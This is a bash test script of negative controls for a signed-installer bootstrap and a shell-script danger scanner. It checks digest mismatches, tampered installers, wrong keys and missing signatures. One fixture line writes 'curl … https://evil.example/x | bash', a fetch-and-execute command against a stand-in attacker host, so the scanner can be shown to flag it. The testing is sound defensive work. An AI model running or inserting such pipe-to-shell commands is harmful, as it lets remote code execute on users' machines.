#!/usr/bin/env bash
# Consumer-side negative controls for verified bootstrap wiring (SHS-TASK-002).
# Fail-closed proofs: wrong digest, stale soft pin, dogfood non-vacuity.
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

fail() {
    echo "FAIL: $*" >&2
    exit 1
}
pass() { echo "PASS: $*"; }

# --- Wrong engine digest fails before execution ---
WORKDIR="$(mktemp -d "${TMPDIR:-/tmp}/shs-neg.XXXXXX")"
trap 'rm -rf "${WORKDIR}"' EXIT

set +e
OUT="${WORKDIR}/bad-digest.txt"
SFETCH_VERSION=v0.4.11 \
    SFETCH_ENGINE_SHA=0c2e7490420100b5d35a9e01f96f4aea8679663e \
    SFETCH_ENGINE_SHA256=0000000000000000000000000000000000000000000000000000000000000000 \
    INSTALL_DIR="${WORKDIR}/should-not-exist" \
    ./scripts/install-sfetch-verified.sh >"$OUT" 2>&1
RC=$?
set -e
[ "$RC" -ne 0 ] || fail "wrong engine digest should fail"
grep -qi 'mismatch\|SHA-256\|digest' "$OUT" || fail "expected digest mismatch message (log: $(cat "$OUT"))"
[ ! -d "${WORKDIR}/should-not-exist" ] || [ -z "$(ls -A "${WORKDIR}/should-not-exist" 2>/dev/null || true)" ] ||
    fail "install dir must not receive tools after digest failure"
pass "wrong engine digest fails closed before install"

# --- Missing/invalid floating version refused ---
set +e
OUT2="${WORKDIR}/latest.txt"
SFETCH_VERSION=latest \
    SFETCH_ENGINE_SHA=0c2e7490420100b5d35a9e01f96f4aea8679663e \
    SFETCH_ENGINE_SHA256=b45f0b0eb0e94728253de4dfb4306a3965e7266103a22c7cfdf1a6de62308b9a \
    INSTALL_DIR="${WORKDIR}/latest-dir" \
    ./scripts/install-sfetch-verified.sh >"$OUT2" 2>&1
RC=$?
set -e
[ "$RC" -ne 0 ] || fail "latest must be refused"
pass "floating version latest refused"

# --- Tampered installer fails minisign before bash (manual 3-step) ---
ANCHOR="RWTAoUJ007VE3h8tbHlBCyk2+y0nn7kyA4QP34LTzdtk8M6A2sryQtZC"
BASE="https://github.com/3leaps/sfetch/releases/download/v0.4.11"
curl -fsSL -o "${WORKDIR}/install-sfetch.sh" "${BASE}/install-sfetch.sh"
curl -fsSL -o "${WORKDIR}/install-sfetch.sh.minisig" "${BASE}/install-sfetch.sh.minisig"
printf 'untrusted comment: sfetch\n%s\n' "$ANCHOR" >"${WORKDIR}/anchor.pub"
# Positive control first
command -v minisign >/dev/null 2>&1 || fail "minisign required for negative harness (CI provides via setup-sfetch PATH or apt)"
minisign -Vm "${WORKDIR}/install-sfetch.sh" -p "${WORKDIR}/anchor.pub" -x "${WORKDIR}/install-sfetch.sh.minisig" >/dev/null
echo "evil" >>"${WORKDIR}/install-sfetch.sh"
set +e
minisign -Vm "${WORKDIR}/install-sfetch.sh" -p "${WORKDIR}/anchor.pub" -x "${WORKDIR}/install-sfetch.sh.minisig" >/dev/null 2>&1
RC=$?
set -e
[ "$RC" -ne 0 ] || fail "tampered installer must fail minisign"
pass "tampered install-sfetch.sh fails minisign (pre-exec)"

# --- Wrong anchor fails (valid-format key that is not the sfetch consumer key) ---
printf 'untrusted comment: wrong\n%s\n' "RWRmv9jBMKA5u4oJcHvIecPCGska+m6wDgGNYG4UROS9LTyDijkUqcka" >"${WORKDIR}/wrong.pub"
# restore clean installer
curl -fsSL -o "${WORKDIR}/install-sfetch.sh" "${BASE}/install-sfetch.sh"
set +e
minisign -Vm "${WORKDIR}/install-sfetch.sh" -p "${WORKDIR}/wrong.pub" -x "${WORKDIR}/install-sfetch.sh.minisig" >/dev/null 2>&1
RC=$?
set -e
[ "$RC" -ne 0 ] || fail "wrong anchor must fail"
pass "wrong anchor fails minisign"

# --- Missing signature fails ---
rm -f "${WORKDIR}/install-sfetch.sh.minisig"
set +e
minisign -Vm "${WORKDIR}/install-sfetch.sh" -p "${WORKDIR}/anchor.pub" >/dev/null 2>&1
RC=$?
set -e
[ "$RC" -ne 0 ] || fail "missing minisig must fail"
pass "missing install-sfetch.sh.minisig fails"

# --- Freshness soft-warn on deliberately stale pin (exit 0) ---
set +e
OUTF="${WORKDIR}/fresh.txt"
./scripts/check-sfetch-pin-freshness.sh v0.4.9 >"$OUTF" 2>&1
RC=$?
set -e
[ "$RC" -eq 0 ] || fail "stale pin freshness must soft-exit 0 (got $RC)"
grep -qiE 'behind|warning|::warning' "$OUTF" || fail "stale pin should warn (log: $(cat "$OUTF"))"
pass "stale pin freshness warns without failing the job"

# --- Dogfood non-vacuity: deliberately dangerous fixture fails --exit-on-danger ---
# Build shellsentry if needed
SS=""
if [ -x bin/shellsentry ]; then
    SS=bin/shellsentry
else
    SS="$(find bin -maxdepth 1 -type f -name 'shellsentry_*' 2>/dev/null | head -n1 || true)"
fi
if [ -z "$SS" ] || [ ! -x "$SS" ]; then
    make build >/dev/null
    if [ -x bin/shellsentry ]; then
        SS=bin/shellsentry
    else
        SS="$(find bin -maxdepth 1 -type f -name 'shellsentry_*' 2>/dev/null | head -n1 || true)"
    fi
fi
if [ -z "$SS" ] || [ ! -x "$SS" ]; then
    fail "shellsentry binary missing for dogfood negative"
fi
printf '#!/bin/sh\ncurl -fsSL https://evil.example/x | bash\n' >"${WORKDIR}/evil.sh"
set +e
"$SS" --exit-on-danger "${WORKDIR}/evil.sh" >/dev/null 2>&1
RC=$?
set -e
[ "$RC" -ne 0 ] || fail "dogfood non-vacuity: dangerous fixture must fail --exit-on-danger"
pass "dogfood non-vacuity: dangerous fixture fails closed"

echo "[ok] bootstrap negative controls complete"
